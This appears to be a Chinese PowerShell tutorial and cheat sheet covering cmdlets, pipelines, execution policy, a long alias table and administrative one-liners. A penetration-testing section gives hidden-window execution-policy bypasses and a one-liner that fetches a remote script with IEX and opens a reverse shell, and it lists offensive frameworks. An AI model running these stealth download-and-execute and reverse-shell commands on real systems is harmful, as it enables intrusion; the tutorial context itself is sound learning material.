`Gmeek-html<img src="https://erainnovator.com/wp-content/uploads/2021/04/PowerShell.png">`

# Powershell的基本概念

## ps1文件
一个PowerShell脚本其实就是一个简单的文本文件， 这个文件包含了一系列PowerShell命令，每个命令显示为独立的一行，文件名需要加上.ps1的扩展名。

## 运行脚本
运行PowerShell脚本，必须键入完整的路径和文件名，例如，你要运行一个名为a.ps1的脚本，可以键入C:\Scripts\a.ps1 


## 获取 PowerShell Command一覧

```
PS>  gcm　或者   PS>  get-command
```

## Powershell的常用命令
在PowerShell下，类似“cmd命令"叫作"cmdlet" ，其命名规范相当一致，都采用"动词-名词”的形式，如New-ltem，动词部分般为Add、 New、Get、Remove、Set等， 命名的别名一般兼容Windows Command和Linux Shell,如Get-Childltem命令使用dir或|s均可，而且**PowerShell命令不区分大小写**

下面以文件操作为例讲解PowerShell命令的基本用法
- 新建目录: New-Item -Path 'E:\Test Folder' -ItemType Directory
- 新建文件: New-Item -Path new.txt -ItemType File
- 删除目录: Remove-Item 'E:\Test Folder'
- 显示文本内容: Get-Content new.txt
- 置文本内容: Set-Content new.txt -Value "hello, word! "
- 追加内容: Add-Content new.txt -Value "i love you"
- 清除内容: Clear-Content new.txt

## 管道
管道的作用是将一个命令的输出作为另一个命令的输入， 两个命令之间用管道符号`|` 连接。
举一个例子、停止所有目前运行中的，以"p"字符开头命名的程序，命令如下所示。
```
PS> get-process p* | stop-process
```


# Powershell进阶篇 

## 执行策略
为防止恶意脚本的执行，PowerShell的执行策略，默认情况下，Restricted:脚本不能运行，可以通过以下命令查看当前的执行策略。
- Get-ExecutionPolicy：
  - Restricted:脚本不能运行(默认设置)。
  - RemoteSigned:本地创建的脚本可以运行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)。
  - AllSigned:仅当脚本由受信任的发布者签名时才能运行。
  - Unrestricted: 允许所有的script运行。

- Set-ExecutionPolicy <policy name>
可以通过上面命令改变PowerShell的执行策略。

如果要运行PowerShell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted，所以在渗透时，就需要采用一些方法绕过策略来执行脚本， 比如下面这三种。

1. 绕过本地权限执行
上传xx.ps1至目标服务器，在CMD环境下，在目标服务器本地执行该脚本，如下所示。
```
PowerShell.exe -ExecutionPolicy Bypass -File xx.ps1
```

2. 本地隐藏绕过权限执行脚本
```
PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile File xx.ps1
```

3. 用IEX下载远程PS1脚本绕过权限执行
```
PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonI -NoProfile iex (New-Object Net.WebClient).DownloadString("xxx.ps1");Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

上述参数的说明，如下
- `ExecutionPolicy Bypass`绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全保护规则
- `WindowStyle Hidden`　隐藏窗口
- `NoLogo`　启动不显示版权标志的PowerShell.
- `NonInteractive (-Nonl) `　非交互模式，PowerShell不为用户提供交互的提示。
- `NoProfile (-NoP) `　PowerShell控制台不加载当前用户的配置文件。
- `Noexit`　执行后不退出Shell。这在使用键盘记录脚本时非常重要。


## 常用的PowerShel攻击工具有以下这几种

- `PowerSplit`　这是众多PowerShell攻击工具中被广泛使用的PowerShel后期漏洞利用框架，常用于信息探测、特权提升、凭证窃取、持久化等操作。

- `Nishang`　基于PowerShell的渗透测试专用工具， 集成了框架、脚本和各种Payload,包含下载和执行、键盘记录、DNS、 延时命令等脚本。

- `Empire`　基于PowerShel的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块、信息探测、凭据窃取、持久化控制。

- `PowerCat`　Powershell版的NetCat, 有着网络工具中的"瑞士军刀”美誉，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。




# 获取 PowerShell Alias一覧

```
PS>  gal　或者   PS>  Get-Alias
```

`Gmeek-html<img src="https://linuxhint.com/wp-content/uploads/2022/01/create-powershell-alias-01.png">`

## PowerShell Alias一覧

|PowerShell Alias|PowerShell Command|例子|
|---|---|---|
|**命令**|**Command**|**⇣⇣⇣⇣⇣**|
|`gcm` 👙 |  Get-Command|例：`Get-Command Get-*`　查找所有以 Get- 开头的 cmdlets|
|icm|  Invoke-Command|
|shcm|  Show-Command|
|trcm|  Trace-Command|
|**别名**|**Alias**|**⇣⇣⇣⇣⇣**|
|`gal`👙 |  Get-Alias|显示PowerShell Alias一覧|
|nal|  New-Alias|
|sal|  Set-Alias|
|ipal|  Import-Alias|
|epal|  Export-Alias|
|**磁盘**|**PSDrive**|**⇣⇣⇣⇣⇣**|
|gdr|  Get-PSDrive|
|mount|  New-PSDrive|
|ndr|  New-PSDrive|
|rdr|  Remove-PSDrive|
|**目录**|**Location**|**⇣⇣⇣⇣⇣**|
|`pwd`🔥|  Get-Location|显示当前所在目录|
|gl|  Get-Location|同上|
|`cd`🔥|   Set-Location|例：`Set-Location C:\Users\YourName\Documents`  切换文档目录|
|chdir|Set-Location|同上|
|sl|  Set-Location|同上|
|popd|  Pop-Location|？|
|pushd|  Push-Location|？|
|**子目录或文件**|**ChildItem**|**⇣⇣⇣⇣⇣**|
|`ls`🔥|  Get-ChildItem|列出当前目录下的所有文件和目录|
|`dir`🔥|  Get-ChildItem|同上|
|gci|  Get-ChildItem|同上|
|**操作目录或文件**|**Item**|**⇣⇣⇣⇣⇣**|
|`copy`🔥|  Copy-Item|例：`Copy-Item C:\source\test.txt C:\destination\`  复制文件 test.txt 到另一个目录|
|`cp`🔥|  Copy-Item|同上|
|cpi|  Copy-Item|同上|
|`mv`🔥| Move-Item|例：`Move-Item C:\temp\oldname.txt C:\temp\newfolder\newname.txt`  将文件 oldname.txt 移动到 newfolder 并重命名为 newname.txt|
|move|  Move-Item|同上|
|mi|  Move-Item|同上|
|`ren`🔥|  Rename-Item|例：`Rename-Item C:\temp\oldname.txt C:\temp\newname.txt`  将文件 oldname.txt 重命名为 newname.txt|
|rni|  Rename-Item|同上|
|`del`🔥|  Remove-Item|例：`Remove-Item C:\temp\test.txt -Force`  删除名为 test.txt 的文件|
|`rm`🔥|  Remove-Item|同上|
|`rmdir`🔥|  Remove-Item|同上|
|erase|  Remove-Item|同上|
|rd|  Remove-Item|同上|
|ri|  Remove-Item|同上|
|ni|  New-Item|例：`New-Item -ItemType Directory -Path .\myFolder`  在当前目录下创建一个名为 myFolder 的新目录|
|gi|  Get-Item|？|
|si|  Set-Item|？|
|ii|  Invoke-Item|？|
|cli|  Clear-Item|？|
|`md`🔥|  mkdir|创建文件夹|
|**操作目录或文件属性**|**ItemProperty**|**⇣⇣⇣⇣⇣**|
|gp|  Get-ItemProperty|
|sp|  Set-ItemProperty|
|clp|  Clear-ItemProperty|
|rnp|  Rename-ItemProperty|
|rp|  Remove-ItemProperty|
|cpp|  Copy-ItemProperty|
|mp|  Move-ItemProperty|
|gpv|  Get-ItemPropertyValue|
|**变量**|**Variable**|**⇣⇣⇣⇣⇣**|
|set|  Set-Variable|
|sv|  Set-Variable|
|gv|  Get-Variable|
|nv|  New-Variable|
|clv|  Clear-Variable|
|rv|  Remove-Variable|
|**屏幕**|**Host**|**⇣⇣⇣⇣⇣**|
|`write`🔥|  Write-Output|例：`Write-Host "Hello, world!"`  输出 Hello, world!|
|`echo`🔥|  Write-Output|同上|
|`clear`🔥|Clear-Host|清除控制台屏幕|
|`cls`🔥|  Clear-Host|同上|
|**屏幕记录**|**History**|**⇣⇣⇣⇣⇣**|
|clhy| Clear-History|
|ghy|  Get-History|
|h|  Get-History|
|history|  Get-History|
|ihy|  Invoke-History|
|r|  Invoke-History|
|**比較**|**Compare**|**⇣⇣⇣⇣⇣**|
|`diff`🔥|  Compare-Object|例：`$list1 = 1..5 $list2 = 2..6 Compare-Object -ReferenceObject $list1 -DifferenceObject $list2`  比较两个数字列表的不同之处|
|`compare`🔥|  Compare-Object|同上|
|**进程**|**Process**|**⇣⇣⇣⇣⇣**|
|`ps`🔥|  Get-Process|获取所有运行中的进程|
|gps|  Get-Process|同上|
|start|  Start-Process|例：`Start-Process notepad`  启动记事本应用程序|
|saps|  Start-Process|同上|
|kill|  Stop-Process|例：`Stop-Process -Name notepad`  终止所有名为 notepad 的进程|
|spps|  Stop-Process|同上|
|**服务**|**Service**|**⇣⇣⇣⇣⇣**|
|`gsv`🔥|  Get-Service|获取所有服务的状态|
|sasv|  Start-Service|例：`Start-Service -Name spooler`  启动 Print Spooler 服务|
|spsv|  Stop-Service|例：`Stop-Service -Name spooler`  停止 Print Spooler 服务|
|ー|  Restart-Service|例：`Restart-Service -Name spooler`  重启 Print Spooler 服务|
|**任務**|**Job**|**⇣⇣⇣⇣⇣**|
|`gjb`🔥|  Get-Job|
|sajb|  Start-Job|
|spjb|  Stop-Job|
|wjb|  Wait-Job|
|rjb|  Remove-Job|
|rcjb|  Receive-Job|
|rujb|  Resume-Job|
|sujb|  Suspend-Job|
|**文件操作**|**Content**|**⇣⇣⇣⇣⇣**|
|`cat`🔥|  Get-Content|例：`$content = Get-Content -Path "C:\temp\input.txt"`  读取文件内容|
|`type`🔥|  Get-Content|同上|
|gc|  Get-Content|同上|
|sc|  Set-Content|例：`"Hello, world!" \| Set-Content -Path "C:\temp\output.txt"`  写入文件内容|
|ac|  Add-Content|例：`"Another line" \| Add-Content -Path "C:\temp\output.txt"` 添加文件内容|
|clc|  Clear-Content|
|**CSV操作**|**CSV**|**⇣⇣⇣⇣⇣**|
|ipcsv|  Import-Csv|例：`$data = Import-Csv -Path "C:\temp\data.csv"`  从 CSV 文件导入数据|
|epcsv|  Export-Csv|例：`$data \| Export-Csv -Path "C:\temp\output.csv" -NoTypeInformatio`  将数据导出为 CSV 文件|
|**网络请求**|**WebRequest**|**⇣⇣⇣⇣⇣**|
|`wget`🔥|  Invoke-WebRequest|例：`Invoke-WebRequest -Uri "https://api.github.com/repos/powershell/powershell/releases/latest"`  获取 GitHub 上最新发布的版本信息|
|`curl`🔥|  Invoke-WebRequest|同上|
|iwr|  Invoke-WebRequest|同上|
|**Session**|**PSSession**|**⇣⇣⇣⇣⇣**|
|cnsn| Connect-PSSession|
|dnsn|  Disconnect-PSSession|
|epsn|  Export-PSSession|
|etsn|  Enter-PSSession|
|exsn|  Exit-PSSession|
|gsn|  Get-PSSession|
|ipsn|  Import-PSSession|
|rcsn|  Receive-PSSession|
|rsn|  Remove-PSSession|
|nsn|  New-PSSession|
|npssc|  New-PSSessionConfigur|
|**Breakpoint**|**PSBreakpoint**|**⇣⇣⇣⇣⇣**|
|dbp|  Disable-PSBreakpoint|
|ebp|  Enable-PSBreakpoint|
|gbp|  Get-PSBreakpoint|
|sbp|  Set-PSBreakpoint|
|rbp|  Remove-PSBreakpoint|
|**その他**|**Others**|**⇣⇣⇣⇣⇣**|
|`man`🔥|  help|例：`Get-Help Get-Process`  获取 Get-Process 的帮助文档|
|ise|  powershell_ise.exe|
|%|    ForEach-Object|
|foreach|  ForEach-Object|
|where|  Where-Object|例：`Get-Process \| Where-Object { $_.CPU -gt 10 }`  获取 CPU 占用率大于 10% 的所有进程|
|?|    Where-Object|同上|
|asnp| Add-PSSnapin|
|CFS|  ConvertFrom-String|
|cvpa|  Convert-Path|
|fc|  Format-Custom|
|fhx|  Format-Hex|
|fl|  Format-List|
|ft|  Format-Table|
|fw|  Format-Wide|
|`gcb`🌛|  Get-Clipboard|
|`gcs`🌛|  Get-PSCallStack|
|`gin`🌛|  Get-ComputerInfo|
|`gm`🌛|  Get-Member|
|`gmo`🌛|  Get-Module|
|`gsnp`🌛|  Get-PSSnapin|
|`gtz`🌛|  Get-TimeZone|
|`gu`🌛|  Get-Unique|
|`gwmi`🌛|  Get-WmiObject|例：`Get-WmiObject -Class Win32_OperatingSystem`  获取操作系统信息|
|group|  Group-Object|例：`Get-Process \| Group-Object -Property MainModule.FileName`  按主模块的文件名分组进程|
|`iex` 🔥 |  Invoke-Expression|
|ipmo|  Import-Module|
|irm|  Invoke-RestMethod|
|iwmi|  Invoke-WmiMethod|
|lp|  Out-Printer|
|measure|  Measure-Object|
|nmo|  New-Module|
|ogv|  Out-GridView|
|oh|  Out-Host|
|rmo|  Remove-Module|
|rsnp|  Remove-PSSnapin|
|rvpa|  Resolve-Path|
|rwmi|  Remove-WmiObject|
|scb|  Set-Clipboard|
|select|  Select-Object|
|sleep|  Start-Sleep|
|sls|  Select-String|例：`Select-String -Path "C:\temp\log.txt" -Pattern "error"`  在日志文件中搜索含有 "error" 的行|
|sort|  Sort-Object|例：`Get-Process \| Sort-Object -Property CPU -Desc`   按 CPU 占用率降序排列所有进程|
|stz|  Set-TimeZone|
|swmi|  Set-WmiInstance|在 WMI 中创建或修改实例|
|tee|  Tee-Object|



## PowerShell命令特殊用法
- `cd hkcu`　　像文件系统那样操作Windows Registry
- `dir –r | select string "searchforthis"`　在文件里递回地搜索某个字符串
- `ps | sort –p ws | select –last 5`　使用内存找到五个进程
- `Restart-Service DHCP`　　重启一个服务，如DHCP
- `Get-ChildItem – Force`　　在文件夹里列出所有条目
- `Get-ChildItem –Force c:\directory –Recurse`　　递归一系列的目录或文件夹
-`Remove-Item C:\tobedeleted –Recurse`　　在目录里移除所有文件而不需要单个移除

- `Get-Content Env:COMPUTERNAME` 获取计算机名

- `Get-WmiObject -Class Win32_OperatingSystem -ComputerName .).Win32Shutdown(2)` 重启当前计算机
- `Get-WmiObject -Class Win32_ComputerSystem` 获取计算机组成或模型信息
- `Get-WmiObject -Class Win32_BIOS -ComputerName` 获取当前计算机的BIOS信息
- `Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName` 列出所安装的修复程序（如QFE或Windows Update文件）
- `Get-WmiObject -Class Win32_ComputerSystem -Property UserName -ComputerName` 获取当前登录计算机的用户的用户名
- `Get-WmiObject -Class Win32_Product -ComputerName . | Format-Wide -Column 1` 获取当前计算机所安装的应用的名字
- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=TRUE -ComputerName . | Format-Table -Property IPAddress` 获取分配给当前计算机的IP地址
- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=TRUE -ComputerName . | Select-Object -Property [a-z]* -ExcludeProperty IPX*,WINS*`  获取当前机器详细的IP配置报道
- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=true" -ComputerName`  找到当前计算机上使用DHCP启用的网络卡
- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=true -ComputerName . | ForEach-Object -Process {$_.EnableDHCP()}` 在当前计算机上的所有网络适配器上启用DHCP
- `Get-WMIObject -ComputerName TARGETMACHINE -List | Where-Object -FilterScript {$_.Name -eq "Win32_Product"}).Install(\MACHINEWHEREMSIRESIDES\path\package.msi`  在远程计算机上安装MSI包
- `Get-WmiObject -Class Win32_Product -ComputerName . -Filter "Name='name_of_app_to_be_upgraded'").Upgrade(\MACHINEWHEREMSIRESIDES\path\upgrade_package.msi`　使用基于MSI的应用升级包升级所安装的应用
- `Get-WmiObject -Class Win32_Product -Filter "Name='product_to_remove'" -ComputerName . ).Uninstall()` 从当前计算机移除MSI包

- `Start-Sleep 60; Restart-Computer –Force –ComputerName TARGETMACHINE` 一分钟后远程关闭另一台机器
- `New-Object -ComObject WScript.Network).AddWindowsPrinterConnection(\printerserver\hplaser3`　添加打印机
- `New-Object -ComObject WScript.Network).RemovePrinterConnection("\printerserver\hplaser3 "`  移除打印机
- `invoke-command -computername machine1, machine2 -filepath c:\Script\script.ps1`　进入PowerShell会话


